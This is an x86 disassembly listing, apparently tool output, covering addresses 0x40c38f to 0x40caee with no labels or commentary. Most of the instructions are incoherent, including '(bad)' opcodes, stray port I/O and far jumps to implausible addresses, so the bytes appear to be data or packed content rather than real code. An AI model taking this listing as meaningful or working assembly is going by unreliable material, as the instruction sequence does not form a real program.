  40c38f:	dec    esp
  40c390:	lock jnp 0x40c327
  40c393:	and    DWORD PTR [edi],ebx
  40c395:	jl     0x40c336
  40c397:	add    BYTE PTR [ecx+esi*4+0x55f69d0b],ah
  40c39e:	mov    ds:0x1fe90626,al
  40c3a3:	into   
  40c3a4:	aad    0xc4
  40c3a6:	into   
  40c3a7:	mov    DWORD PTR [ebp-0x7b8446ef],edi
  40c3ad:	arpl   sp,di
  40c3af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b0:	sub    cl,dh
  40c3b2:	xchg   esi,eax
  40c3b3:	dec    edx
  40c3b4:	jmp    0x5e5919d3
  40c3b9:	aas    
  40c3ba:	sti    
  40c3bb:	frstor [edi+esi*2]
  40c3be:	lock mov ah,0xec
  40c3c1:	or     eax,0xca183d1c
  40c3c6:	xlat   BYTE PTR ds:[ebx]
  40c3c7:	jb     0x40c3fa
  40c3c9:	xchg   BYTE PTR [ecx+0x4c],cl
  40c3cc:	mov    al,bl
  40c3ce:	gs push esp
  40c3d0:	daa    
  40c3d1:	not    BYTE PTR [edx-0x13]
  40c3d4:	data16 jle 0x40c3ba
  40c3d7:	rcl    WORD PTR [ebp+0x64f66a09],1
  40c3de:	jo     0x40c416
  40c3e0:	pop    es
  40c3e1:	adc    ah,BYTE PTR fs:[eax+0x5a]
  40c3e5:	clc    
  40c3e6:	adc    DWORD PTR [ebp+0x4ab1d5c],edi
  40c3ec:	mov    esi,0x505ab2e1
  40c3f1:	dec    edi
  40c3f2:	sub    DWORD PTR [ebx-0x10f8867d],ebx
  40c3f8:	lods   eax,DWORD PTR ds:[esi]
  40c3f9:	mov    ah,0x1
  40c3fb:	ins    DWORD PTR es:[edi],dx
  40c3fc:	push   edx
  40c3fd:	in     al,dx
  40c3fe:	pop    edi
  40c3ff:	test   BYTE PTR [ebp-0x75],dh
  40c402:	loop   0x40c3ae
  40c404:	jmp    0xa26e:0xc689844d
  40c40b:	mov    eax,0x895b184b
  40c410:	push   eax
  40c411:	fistp  DWORD PTR [edi-0x50f8084e]
  40c417:	sub    BYTE PTR [edi],dl
  40c419:	push   ebp
  40c41a:	xchg   esi,eax
  40c41b:	push   0xced7f68c
  40c420:	ficomp DWORD PTR [eax-0x53d800d]
  40c426:	loope  0x40c3e7
  40c428:	sbb    DWORD PTR ds:0xa70881c3,edi
  40c42e:	add    dh,BYTE PTR [esi+0x667f9f4e]
  40c434:	adc    al,0x6d
  40c436:	cmp    edx,edi
  40c438:	scas   eax,DWORD PTR es:[edi]
  40c439:	sbb    BYTE PTR [ebp-0x32],0x8
  40c43d:	js     0x40c439
  40c43f:	dec    ecx
  40c440:	jmp    0x46ccc2af
  40c445:	mov    ebx,edx
  40c447:	jg     0x40c3eb
  40c449:	jge    0x40c494
  40c44b:	and    ebp,DWORD PTR [ecx+0xdd2a58c]
  40c451:	cli    
  40c452:	and    BYTE PTR [eax+0x6fae7201],dl
  40c458:	pushf  
  40c459:	retf   0x53bb
  40c45c:	sbb    al,0xbe
  40c45e:	aad    0xbe
  40c460:	mov    ds:0x328842f1,eax
  40c465:	hlt    
  40c466:	jg     0x40c490
  40c468:	bound  ecx,QWORD PTR [ecx]
  40c46a:	out    0x5c,eax
  40c46c:	jle    0x40c42d
  40c46e:	daa    
  40c46f:	jbe    0x40c4c5
  40c471:	frstor [ebp+0x20b0650f]
  40c477:	sub    eax,ebx
  40c479:	cs lahf 
  40c47b:	ss dec ebp
  40c47d:	stos   BYTE PTR es:[edi],al
  40c47e:	push   ds
  40c47f:	gs push 0x1ed9e2e7
  40c485:	(bad)  
  40c486:	push   esi
  40c487:	shl    BYTE PTR [edi-0x46],cl
  40c48a:	shr    BYTE PTR [ebx],1
  40c48c:	pop    ecx
  40c48d:	xchg   edi,eax
  40c48e:	fcmovbe st,st(7)
  40c490:	mov    al,0x44
  40c492:	mov    dh,0x13
  40c494:	add    esp,edi
  40c496:	mov    dh,0xde
  40c498:	data16 mov dh,0x1d
  40c49b:	add    bh,bh
  40c49d:	xchg   DWORD PTR [ecx+0x47d6ad81],edi
  40c4a3:	cs cmp edx,ebp
  40c4a6:	maxps  xmm6,XMMWORD PTR [ecx+0x19d824e8]
  40c4ad:	lds    ebx,FWORD PTR [ebx-0x4bbc8b92]
  40c4b3:	pop    eax
  40c4b4:	add    al,0x4e
  40c4b6:	maskmovq mm4,(bad)
  40c4b7:	mul    DWORD PTR [ebx]
  40c4b9:	loop   0x40c4b1
  40c4bb:	lahf   
  40c4bc:	mov    bl,0x8c
  40c4be:	jcxz   0x40c44f
  40c4c1:	cmp    dl,dh
  40c4c3:	data16 cmp BYTE PTR ds:0xafb12c11,bh
  40c4ca:	sbb    cl,BYTE PTR [ebx]
  40c4cc:	ins    BYTE PTR es:[edi],dx
  40c4cd:	pop    eax
  40c4ce:	sbb    ch,bl
  40c4d0:	add    dh,BYTE PTR [eax-0x4070b480]
  40c4d6:	ja     0x40c50d
  40c4d8:	fmul   QWORD PTR [ebx]
  40c4da:	popa   
  40c4db:	jp     0x40c49d
  40c4dd:	xchg   edi,eax
  40c4de:	xchg   cl,cl
  40c4e0:	lods   eax,DWORD PTR ds:[esi]
  40c4e1:	addr16 pop ebp
  40c4e3:	js     0x40c4d2
  40c4e5:	out    0xb7,al
  40c4e7:	dec    eax
  40c4e8:	dec    esp
  40c4e9:	imul   esi,DWORD PTR [ecx-0x19ad4108],0xfffffffc
  40c4f0:	pop    ebx
  40c4f1:	inc    edx
  40c4f2:	in     eax,dx
  40c4f3:	fisub  WORD PTR [esi+0x10]
  40c4f6:	sub    BYTE PTR [eax+0x1c7c5868],0x8c
  40c4fd:	mov    ax,ds:0x43d3d30f
  40c503:	addr16 repnz mov edx,0xf565a974
  40c50a:	fwait
  40c50b:	and    BYTE PTR [ebp-0x7c6f6794],ah
  40c511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c512:	cmp    DWORD PTR [ecx],edx
  40c514:	daa    
  40c515:	outs   dx,DWORD PTR ds:[esi]
  40c516:	and    al,0xb7
  40c518:	(bad)  [ebp+0x19]
  40c51b:	inc    edi
  40c51c:	bswap  edx
  40c51e:	call   0xc4bc:0x9296d81c
  40c525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c526:	cmp    eax,DWORD PTR [eax]
  40c528:	in     al,0x33
  40c52a:	mov    WORD PTR [ecx+0x44108ec9],cs
  40c530:	enter  0xc8d8,0xa5
  40c534:	stos   BYTE PTR es:[edi],al
  40c535:	mov    ch,0xd8
  40c537:	div    ebp
  40c539:	dec    eax
  40c53a:	or     ch,BYTE PTR es:[edi-0x7db8224f]
  40c541:	je     0x40c57e
  40c543:	icebp  
  40c544:	push   ds
  40c545:	aad    0xb
  40c547:	mov    edi,0x44189d8
  40c54c:	mov    eax,DWORD PTR [ebp-0x20]
  40c54f:	jmp    0x40ca5a
  40c554:	cmp    al,0x3c
  40c556:	ret    0xc2c1
  40c559:	rol    ebx,0xc1
  40c55c:	dec    eax
  40c55d:	pop    ebx
  40c55e:	fwait
  40c55f:	or     DWORD PTR [ecx+edx*8-0x5b794b85],esi
  40c566:	js     0x40c5e0
  40c568:	push   0x7c
  40c56a:	js     0x40c5e4
  40c56c:	in     eax,dx
  40c56d:	dec    ebx
  40c56e:	aaa    
  40c56f:	or     al,0x81
  40c571:	xor    al,0xe5
  40c573:	imul   DWORD PTR [edi+0x32d3f283]
  40c579:	and    al,0x97
  40c57b:	mov    al,ds:0x527d179b
  40c580:	mov    esp,0x4db42217
  40c585:	fisubr DWORD PTR [eax]
  40c587:	adc    al,0x92
  40c589:	xchg   esi,eax
  40c58a:	iret   
  40c58b:	jne    0x40c56c
  40c58d:	pop    ebx
  40c58e:	jbe    0x40c511
  40c590:	sub    eax,0x808aa8d2
  40c595:	mov    ds:0xf0f80454,eax
  40c59a:	ins    BYTE PTR es:[edi],dx
  40c59b:	in     eax,0xe8
  40c59d:	jecxz  0x40c53d
  40c59f:	pop    edx
  40c5a0:	adc    BYTE PTR [esi-0x17],dl
  40c5a3:	out    0x26,eax
  40c5a5:	xchg   ecx,eax
  40c5a6:	pop    ebx
  40c5a7:	xchg   ebx,eax
  40c5a8:	fcomp  DWORD PTR [ebp+0x1f]
  40c5ab:	cdq    
  40c5ac:	inc    ebp
  40c5ad:	push   ds
  40c5ae:	adc    esp,ebx
  40c5b0:	inc    ebx
  40c5b1:	int3   
  40c5b2:	test   ch,al
  40c5b4:	dec    edi
  40c5b5:	stos   BYTE PTR es:[edi],al
  40c5b6:	mov    esi,0xbd15dd2
  40c5bb:	adc    DWORD PTR [ebx],esi
  40c5bd:	test   BYTE PTR [edx-0x7bfbfe40],cl
  40c5c3:	pop    edi
  40c5c4:	jns    0x40c5ca
  40c5c6:	jp     0x40c5c7
  40c5c8:	adc    ebp,edx
  40c5ca:	push   ebp
  40c5cb:	fsubp  st(4),st
  40c5cd:	xchg   ebx,eax
  40c5ce:	pop    edx
  40c5cf:	adc    BYTE PTR [eax],ah
  40c5d1:	repnz adc DWORD PTR [edi-0x396c4a90],eax
  40c5d8:	inc    esp
  40c5d9:	(bad)  [esi]
  40c5db:	ja     0x40c591
  40c5dd:	dec    esi
  40c5de:	add    DWORD PTR [edx-0x149f11e0],ecx
  40c5e4:	mov    esp,DWORD PTR [eax+0x36]
  40c5e7:	call   0xac9b:0x86561c5f
  40c5ee:	push   esp
  40c5ef:	jmp    0xb3deecab
  40c5f4:	pop    es
  40c5f5:	sub    ah,BYTE PTR [esi-0x26]
  40c5f8:	lods   eax,DWORD PTR ds:[esi]
  40c5f9:	leave  
  40c5fa:	push   cs
  40c5fb:	into   
  40c5fc:	(bad)  
  40c5fd:	std    
  40c5fe:	ror    DWORD PTR [edx+0x72d9168],cl
  40c604:	pop    edi
  40c605:	xchg   esi,eax
  40c606:	outs   dx,DWORD PTR ds:[esi]
  40c607:	sbb    al,0x37
  40c609:	xor    BYTE PTR [ebx-0x5],cl
  40c60c:	pop    esp
  40c60d:	rcr    DWORD PTR [edx-0x66],0x82
  40c611:	mov    ch,0xd5
  40c613:	lds    ebx,FWORD PTR [esi-0x764a262]
  40c619:	imul   esp,DWORD PTR [edx-0x72],0xfffffffa
  40c61d:	rcl    DWORD PTR [esi],0x4c
  40c620:	sbb    DWORD PTR [esi],edx
  40c622:	outs   dx,DWORD PTR ds:[esi]
  40c623:	shl    BYTE PTR [ebp-0x67afe427],cl
  40c629:	es leave 
  40c62b:	loop   0x40c5be
  40c62d:	mov    esi,DWORD PTR [ecx+0x44]
  40c630:	or     BYTE PTR [eax],dh
  40c632:	add    BYTE PTR [ecx-0x21],ah
  40c635:	push   edi
  40c636:	lea    ebp,ds:0xc53a7d95
  40c63c:	xchg   esi,eax
  40c63d:	mov    ebx,0x90e4863
  40c642:	les    edi,FWORD PTR es:[edi-0x69]
  40c646:	mov    dh,0x98
  40c648:	aas    
  40c649:	sahf   
  40c64a:	add    BYTE PTR [ecx+0x31],0x7c
  40c64e:	push   ds
  40c64f:	and    DWORD PTR [eax],ecx
  40c651:	sbb    al,0xab
  40c653:	cmp    bl,BYTE PTR [edx+0x328c2e5]
  40c659:	mov    ds,WORD PTR ds:0xb343d561
  40c65f:	and    eax,0xc9b89220
  40c664:	data16 test al,0x50
  40c667:	cdq    
  40c668:	popf   
  40c669:	pop    ss
  40c66a:	div    BYTE PTR [edi+0x7d90d29c]
  40c670:	test   al,0xaf
  40c672:	jnp    0x40c68a
  40c674:	push   ecx
  40c675:	add    esi,edi
  40c677:	repz jg 0x40c6c0
  40c67a:	xchg   edi,eax
  40c67b:	jle    0x40c6a5
  40c67d:	gs in  al,0xfd
  40c680:	fidivr DWORD PTR es:[esi-0x44]
  40c684:	sar    DWORD PTR ds:0x8724e7e,cl
  40c68a:	or     ecx,ecx
  40c68c:	mov    ecx,0xe32888e3
  40c691:	out    dx,al
  40c692:	icebp  
  40c693:	dec    eax
  40c694:	(bad)  
  40c695:	jmp    0x3a551f61
  40c69a:	outs   dx,DWORD PTR ds:[esi]
  40c69b:	jmp    0x218095f6
  40c6a0:	arpl   WORD PTR [ebp-0x6c],di
  40c6a3:	push   eax
  40c6a4:	inc    eax
  40c6a5:	sub    eax,0x2576e200
  40c6aa:	pushf  
  40c6ab:	mov    ds:0x8a4963c0,eax
  40c6b0:	mov    ch,0xc1
  40c6b2:	push   0x738a0825
  40c6b7:	adc    eax,0x224280f1
  40c6bc:	scas   eax,DWORD PTR es:[edi]
  40c6bd:	dec    esp
  40c6be:	mov    ebp,0x36cb1ad8
  40c6c3:	xor    eax,0xc47e11f
  40c6c8:	je     0x40c740
  40c6ca:	test   BYTE PTR [eax-0x6a],bl
  40c6cd:	retf   
  40c6ce:	inc    edi
  40c6cf:	add    DWORD PTR [edi-0x785c1434],edx
  40c6d5:	je     0x40c72b
  40c6d7:	(bad)  
  40c6d8:	mov    eax,DWORD PTR [edi-0x3d]
  40c6db:	push   ebp
  40c6dc:	fst    DWORD PTR [ebp-0x5c]
  40c6df:	mov    BYTE PTR [esi],ah
  40c6e1:	mov    eax,ds:0x79fe2932
  40c6e6:	xlat   BYTE PTR ds:[ebx]
  40c6e7:	and    DWORD PTR [ebp-0x15],ebp
  40c6ea:	gs das 
  40c6ec:	push   ebp
  40c6ed:	jbe    0x40c6db
  40c6ef:	add    al,0x17
  40c6f1:	adc    al,0x6e
  40c6f3:	fninit 
  40c6f5:	push   ss
  40c6f6:	js     0x40c6a8
  40c6f8:	push   esi
  40c6f9:	inc    eax
  40c6fa:	imul   ecx,edi,0xffffff9b
  40c6fd:	data16 cli 
  40c6ff:	imul   esi,DWORD PTR [esi-0x7e317fdc],0xffffffb2
  40c706:	or     eax,0x4fa90646
  40c70b:	repnz sbb eax,0x3d5ed678
  40c711:	lea    edx,[esi-0x15]
  40c714:	lea    esp,[edi-0x559372cc]
  40c71a:	scas   eax,DWORD PTR es:[edi]
  40c71b:	cmc    
  40c71c:	jmp    0xa244:0xd9c3c585
  40c723:	xor    DWORD PTR [ebx],0x8a04f7a5
  40c729:	loopne 0x40c74a
  40c72b:	mov    ah,0xb2
  40c72d:	pop    edx
  40c72e:	sub    cl,BYTE PTR [ecx+0x527f76a9]
  40c734:	iret   
  40c735:	jnp    0x40c763
  40c737:	ss mov ecx,0xa617dd1d
  40c73d:	ins    DWORD PTR es:[edi],dx
  40c73e:	add    bl,dl
  40c740:	test   al,0xfb
  40c742:	scas   eax,DWORD PTR es:[edi]
  40c743:	mov    WORD PTR ds:0xfc5c566a,gs
  40c749:	xor    cl,dl
  40c74b:	retf   0x2c54
  40c74e:	sti    
  40c74f:	aam    0x86
  40c751:	imul   ecx,DWORD PTR [ecx],0xd1869d23
  40c757:	stos   BYTE PTR es:[edi],al
  40c758:	push   edi
  40c759:	cmp    BYTE PTR [eax-0x61f935],dh
  40c75f:	test   BYTE PTR [esi-0x649790b3],bh
  40c765:	xchg   edi,eax
  40c766:	sub    BYTE PTR [eax+ebx*8-0x6b25c339],bh
  40c76d:	adc    edx,DWORD PTR [ecx+0xa]
  40c770:	add    ecx,DWORD PTR [ebx+edx*4+0x53]
  40c774:	cmp    eax,0x52a10529
  40c779:	in     al,dx
  40c77a:	int3   
  40c77b:	bound  ebx,QWORD PTR [ebx]
  40c77d:	inc    eax
  40c77e:	xor    ah,ch
  40c780:	loopne 0x40c7cc
  40c782:	stos   BYTE PTR es:[edi],al
  40c783:	sbb    DWORD PTR [eax-0x4bb40a21],eax
  40c789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c78a:	inc    ebp
  40c78b:	mov    edx,DWORD PTR [esi-0x62f94ca6]
  40c791:	xor    bl,BYTE PTR ds:0x43a2806c
  40c797:	push   edx
  40c798:	mov    eax,0xfc64b740
  40c79d:	pop    esp
  40c79e:	mov    cl,0xc9
  40c7a0:	lods   al,BYTE PTR ds:[esi]
  40c7a1:	xchg   edx,eax
  40c7a2:	dec    esp
  40c7a3:	mov    ds:0x5be99406,al
  40c7a8:	push   ds
  40c7a9:	gs push esi
  40c7ab:	aam    0xe
  40c7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7ae:	xchg   ecx,eax
  40c7af:	dec    esp
  40c7b0:	xor    esi,DWORD PTR [edi+esi*2-0x72]
  40c7b4:	in     al,0x75
  40c7b6:	pop    esi
  40c7b7:	mov    edx,0x314578f5
  40c7bc:	push   ebx
  40c7bd:	add    ah,dh
  40c7bf:	jns    0x40c742
  40c7c1:	or     BYTE PTR cs:[eax+0x26],0x56
  40c7c6:	sub    DWORD PTR [ecx-0x1c],esp
  40c7c9:	jae    0x40c7aa
  40c7cb:	ret    0xc1e7
  40c7ce:	enter  0x8d8f,0x6e
  40c7d2:	xchg   BYTE PTR [eax],ch
  40c7d4:	das    
  40c7d5:	repz jne 0x40c80c
  40c7d8:	outs   dx,BYTE PTR ds:[esi]
  40c7d9:	aad    0xdc
  40c7db:	fdivr  st,st(4)
  40c7dd:	push   0x7
  40c7df:	jmp    0x40c78b
  40c7e1:	shl    bl,cl
  40c7e3:	mov    eax,0x7a012d41
  40c7e8:	jbe    0x40c7ee
  40c7ea:	imul   edi,DWORD PTR [ecx-0x3d],0xf8121d1c
  40c7f1:	outs   dx,BYTE PTR ds:[esi]
  40c7f2:	add    eax,0x48cad0b7
  40c7f7:	sahf   
  40c7f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7f9:	sbb    eax,0xeabdb884
  40c7fe:	in     eax,0x1f
  40c800:	js     0x40c810
  40c802:	mov    BYTE PTR [ebx],0x3e
  40c805:	les    eax,FWORD PTR [esi+edi*2]
  40c808:	test   eax,0x76d3b899
  40c80d:	call   0xe70f0a6b
  40c812:	lds    ebp,FWORD PTR [edx-0x58]
  40c815:	out    dx,eax
  40c816:	push   ss
  40c817:	into   
  40c818:	lods   al,BYTE PTR ds:[esi]
  40c819:	adc    DWORD PTR [ebx+0x1a],edi
  40c81c:	xchg   edi,eax
  40c81d:	or     BYTE PTR [edx],bl
  40c81f:	pop    edx
  40c820:	push   0x59
  40c822:	jo     0x40c80c
  40c824:	retf   0x9a91
  40c827:	adc    ebx,DWORD PTR [esi+0x19ce186b]
  40c82d:	or     al,0x38
  40c82f:	adc    al,0xa
  40c831:	mov    BYTE PTR [ebx],ah
  40c833:	xchg   ecx,eax
  40c834:	std    
  40c835:	ror    DWORD PTR [eax+0x17],0x4
  40c839:	sahf   
  40c83a:	xchg   DWORD PTR [eax+0x2a0d189e],esp
  40c840:	mov    esp,0x3f5e19d0
  40c845:	jbe    0x40c7fd
  40c847:	xchg   esp,eax
  40c848:	inc    esp
  40c849:	addr16 xchg ebx,eax
  40c84b:	gs fs pushf 
  40c84e:	pop    edi
  40c84f:	inc    edi
  40c850:	pop    eax
  40c851:	loop   0x40c825
  40c853:	xchg   edx,eax
  40c854:	and    DWORD PTR [edi-0x6e],edx
  40c857:	push   esi
  40c858:	call   0xf220fe10
  40c85d:	mov    edx,cs
  40c85f:	dec    ebp
  40c860:	pop    ebp
  40c861:	lods   al,BYTE PTR ds:[esi]
  40c862:	and    eax,0x444c3d41
  40c867:	push   ebp
  40c868:	push   ds
  40c869:	fild   DWORD PTR [ecx+ecx*2]
  40c86c:	int3   
  40c86d:	add    al,0xd1
  40c86f:	mov    cl,0xc5
  40c871:	ja     0x40c8ee
  40c873:	pop    es
  40c874:	out    dx,eax
  40c875:	test   DWORD PTR [eax],ebp
  40c877:	outs   dx,BYTE PTR ds:[esi]
  40c878:	xlat   BYTE PTR ds:[ebx]
  40c879:	leave  
  40c87a:	mov    ecx,0x64deb328
  40c87f:	sub    al,0xf5
  40c881:	inc    edi
  40c882:	test   eax,0xc775e902
  40c887:	outs   dx,BYTE PTR ds:[esi]
  40c888:	dec    ebx
  40c889:	jmp    0x21ed4b74
  40c88e:	mov    edi,0xaf604c66
  40c893:	mov    DWORD PTR [edx],esp
  40c895:	push   ebx
  40c896:	neg    BYTE PTR [ebp+0x53b8f080]
  40c89c:	jle    0x40c835
  40c89e:	cmp    dh,cl
  40c8a0:	(bad)  [eax-0x5537af6a]
  40c8a6:	pop    edx
  40c8a7:	nop
  40c8a8:	jb     0x40c88b
  40c8aa:	pop    es
  40c8ab:	cmp    BYTE PTR ds:0x386d163b,ch
  40c8b1:	hlt    
  40c8b2:	mov    al,0xab
  40c8b4:	sbb    cl,ah
  40c8b6:	or     ebx,ebx
  40c8b8:	sbb    ebp,edi
  40c8ba:	push   es
  40c8bb:	mov    dh,0x2e
  40c8bd:	and    dh,BYTE PTR [ebx+0x33]
  40c8c0:	ss add BYTE PTR es:0xeab1a438,bl
  40c8c8:	out    dx,eax
  40c8c9:	cmp    ebp,ecx
  40c8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8cc:	jecxz  0x40c901
  40c8ce:	xor    al,0xc4
  40c8d0:	mov    dl,0xb9
  40c8d2:	in     al,0x72
  40c8d4:	mov    cl,0x2a
  40c8d6:	mov    bl,0xcd
  40c8d8:	mov    ds:0xfc71053c,al
  40c8dd:	jmp    0x40c936
  40c8df:	nop
  40c8e0:	scas   al,BYTE PTR es:[edi]
  40c8e1:	xchg   edi,eax
  40c8e2:	retf   0x1b63
  40c8e5:	frstor [edi]
  40c8e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8e8:	inc    BYTE PTR [ecx+edx*1+0x4b]
  40c8ec:	adc    DWORD PTR [eax+0x1187d12f],ecx
  40c8f2:	push   0x63
  40c8f4:	sub    BYTE PTR [edi+0x7e897a89],ah
  40c8fa:	ins    DWORD PTR es:[edi],dx
  40c8fb:	pop    esi
  40c8fc:	dec    eax
  40c8fd:	idiv   al
  40c8ff:	dec    esi
  40c900:	test   eax,0xc2296d90
  40c905:	push   0x3b7073b7
  40c90a:	sub    al,BYTE PTR [ebp-0x2e04aa23]
  40c910:	ror    BYTE PTR ds:0x991512d9,cl
  40c916:	inc    ecx
  40c917:	sbb    eax,0xdc82be0f
  40c91c:	arpl   di,bp
  40c91e:	add    eax,0xff85c1b0
  40c923:	mov    ds:0x3a79b7a1,al
  40c928:	inc    ebp
  40c929:	add    DWORD PTR [eax+0x5c],esp
  40c92c:	mov    esi,0x4d7c2b47
  40c931:	out    0x3,al
  40c933:	add    ebx,DWORD PTR [edi+ebp*4]
  40c936:	push   esp
  40c937:	in     al,dx
  40c938:	and    BYTE PTR [edx+edi*4-0x52],bh
  40c93c:	call   0xd00b:0x809a8b7f
  40c943:	imul   ebx,DWORD PTR [edi],0x9
  40c946:	push   ecx
  40c947:	das    
  40c948:	inc    edx
  40c949:	stc    
  40c94a:	in     eax,dx
  40c94b:	mov    ds:0x2587bad9,eax
  40c950:	dec    esp
  40c951:	sub    ebp,DWORD PTR [eax+ebx*1-0x5b6a24cb]
  40c958:	push   0xe50c3606
  40c95d:	xchg   DWORD PTR [ebp-0xe],ebp
  40c960:	push   ss
  40c961:	add    al,0xed
  40c963:	dec    eax
  40c964:	mov    ds:0x627ec22,eax
  40c969:	push   ecx
  40c96a:	loop   0x40c9bd
  40c96c:	or     BYTE PTR [eax+0x5b],cl
  40c96f:	shl    DWORD PTR [edx+0x15],cl
  40c972:	test   DWORD PTR [esi-0xbd962f7],esp
  40c978:	mov    edx,ebp
  40c97a:	xor    al,0xa2
  40c97c:	sbb    DWORD PTR ds:0x6596d4d1,edi
  40c982:	in     al,0xcf
  40c984:	(bad)  
  40c985:	pop    ebx
  40c986:	add    ecx,DWORD PTR [esi-0x2a]
  40c989:	mov    ecx,eax
  40c98b:	mov    fs,WORD PTR [esi-0x70]
  40c98e:	mov    ecx,DWORD PTR [edx]
  40c990:	and    BYTE PTR [eax+0x5b4f81b0],dl
  40c996:	repnz push edx
  40c998:	jbe    0x40c965
  40c99a:	mov    al,0xb2
  40c99c:	xor    eax,DWORD PTR [edx+0x11b173df]
  40c9a2:	or     DWORD PTR [ebp+0x4b],ecx
  40c9a5:	xor    al,0xa9
  40c9a7:	aas    
  40c9a8:	aad    0xd8
  40c9aa:	icebp  
  40c9ab:	cmp    al,0x3e
  40c9ad:	adc    BYTE PTR [eiz*1+0x631ee348],al
  40c9b4:	add    ah,cl
  40c9b6:	add    DWORD PTR [eax],eax
  40c9b8:	test   DWORD PTR [edi],0xf4a301b2
  40c9be:	lahf   
  40c9bf:	jb     0x40c949
  40c9c1:	inc    ebx
  40c9c2:	stos   DWORD PTR es:[edi],eax
  40c9c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c4:	in     eax,dx
  40c9c5:	pusha  
  40c9c6:	outs   dx,BYTE PTR ds:[esi]
  40c9c7:	imul   ecx,ecx,0xffffff8a
  40c9ca:	ret    0xe59d
  40c9cd:	mov    ecx,0xc9582587
  40c9d2:	push   ecx
  40c9d3:	int3   
  40c9d4:	jne    0x40ca2c
  40c9d6:	sti    
  40c9d7:	mov    dl,0x7d
  40c9d9:	mov    bl,0x9d
  40c9db:	in     eax,0x3f
  40c9dd:	arpl   WORD PTR [edx-0x2755edfe],bx
  40c9e3:	loop   0x40ca43
  40c9e5:	aam    0xcd
  40c9e7:	mov    bh,0x41
  40c9e9:	xor    DWORD PTR [esi+0x5b],ecx
  40c9ec:	ja     0x40c97a
  40c9ee:	imul   ecx,DWORD PTR [edi+0x2d],0x3a
  40c9f2:	(bad)  
  40c9f3:	mov    ah,0x2
  40c9f5:	jb     0x40c989
  40c9f7:	(bad)  
  40c9f8:	fnsave [ebx]
  40c9fa:	xchg   esp,eax
  40c9fb:	adc    DWORD PTR [eax+eiz*2],ecx
  40c9fe:	adc    eax,0xc91f8f50
  40ca03:	add    ch,BYTE PTR [ecx+0x5f]
  40ca06:	push   esp
  40ca07:	stos   BYTE PTR es:[edi],al
  40ca08:	stc    
  40ca09:	lods   eax,DWORD PTR ds:[esi]
  40ca0a:	and    BYTE PTR [ecx+0x2ccc8b85],dl
  40ca10:	mov    ebp,0x13f98359
  40ca15:	and    DWORD PTR [esi+0x15],0x48
  40ca19:	retf   
  40ca1a:	in     al,0xdf
  40ca1c:	adc    ecx,edx
  40ca1e:	retf   0x82f1
  40ca21:	sbb    al,0x8
  40ca23:	cmp    esi,eax
  40ca25:	stos   DWORD PTR es:[edi],eax
  40ca26:	jne    0x40ca11
  40ca28:	mov    al,0xb5
  40ca2a:	xchg   BYTE PTR [ebp+0xdda3d16],bl
  40ca30:	in     eax,dx
  40ca31:	repz mov dh,0xa0
  40ca34:	jl     0x40ca47
  40ca36:	add    DWORD PTR [ebx-0x501c0b23],ebx
  40ca3c:	mov    eax,ds:0x857bfcc3
  40ca41:	leave  
  40ca42:	mov    al,0x61
  40ca44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca45:	mov    dh,0xbc
  40ca47:	hlt    
  40ca48:	sbb    BYTE PTR [ecx-0x2],al
  40ca4b:	scas   al,BYTE PTR es:[edi]
  40ca4c:	les    eax,FWORD PTR [ebx+0x4c6c9ef3]
  40ca52:	and    esi,DWORD PTR [edx-0x43]
  40ca55:	(bad)  
  40ca56:	retf   0x6e3e
  40ca59:	dec    edi
  40ca5a:	mov    ecx,DWORD PTR [ebp-0x8]
  40ca5d:	mov    DWORD PTR [ecx+0x8],eax
  40ca60:	jmp    0x40cf6b
  40ca65:	int3   
  40ca66:	sar    DWORD PTR [edi+edi*1],1
  40ca69:	ror    ebp,0xd3
  40ca6c:	rcr    DWORD PTR [eax],1
  40ca6e:	xlat   BYTE PTR ds:[ebx]
  40ca6f:	call   0x32f22347
  40ca74:	xlat   BYTE PTR ds:[ebx]
  40ca75:	lock scas eax,DWORD PTR es:[edi]
  40ca77:	js     0x40caf1
  40ca79:	push   0x7c
  40ca7b:	js     0x40caf5
  40ca7d:	dec    esp
  40ca7e:	jecxz  0x40cadb
  40ca80:	inc    eax
  40ca81:	mov    cl,cl
  40ca83:	mov    al,0xbe
  40ca85:	sub    DWORD PTR [ebp+0x2e],esi
  40ca88:	lock inc ecx
  40ca8a:	lahf   
  40ca8b:	xlat   BYTE PTR ds:[ebx]
  40ca8c:	outs   dx,DWORD PTR ds:[esi]
  40ca8d:	pop    ecx
  40ca8e:	sbb    esp,ecx
  40ca90:	cmp    cl,BYTE PTR [ebx]
  40ca92:	daa    
  40ca93:	arpl   WORD PTR [esi],di
  40ca95:	cwde   
  40ca96:	inc    ebp
  40ca97:	dec    edi
  40ca98:	or     ch,BYTE PTR [ecx]
  40ca9a:	sbb    BYTE PTR [ebp-0x26],bl
  40ca9d:	push   eax
  40ca9e:	add    esp,esp
  40caa0:	ror    BYTE PTR [esi+0x26],1
  40caa3:	std    
  40caa4:	sbb    ecx,DWORD PTR [edx-0x587751bb]
  40caaa:	clc    
  40caab:	inc    eax
  40caac:	mov    eax,0x64084a1f
  40cab1:	sbb    BYTE PTR [edx],0x68
  40cab4:	pop    edi
  40cab5:	scas   al,BYTE PTR es:[edi]
  40cab6:	dec    edi
  40cab7:	pop    esi
  40cab8:	add    esi,DWORD PTR [ecx-0x732747af]
  40cabe:	sti    
  40cabf:	in     al,dx
  40cac0:	mov    edi,0x9169e979
  40cac5:	lock sub bh,BYTE PTR [eax+0x4fbb54da]
  40cacc:	add    BYTE PTR [ebp+0x2939c3c9],0xcd
  40cad3:	xchg   DWORD PTR [esi-0x3eec3533],edi
  40cad9:	sbb    ecx,eax
  40cadb:	push   ebx
  40cadc:	and    eax,0x2f1fc041
  40cae1:	jg     0x40cb1c
  40cae3:	jae    0x40cab3
  40cae5:	mov    dh,0x6f
  40cae7:	fsubr  st(3),st
  40cae9:	cmp    bl,bh
  40caeb:	push   ds
  40caec:	lods   eax,DWORD PTR ds:[esi]
  40caed:	pop    esp
  40caee:	repz mov dl,0x8b
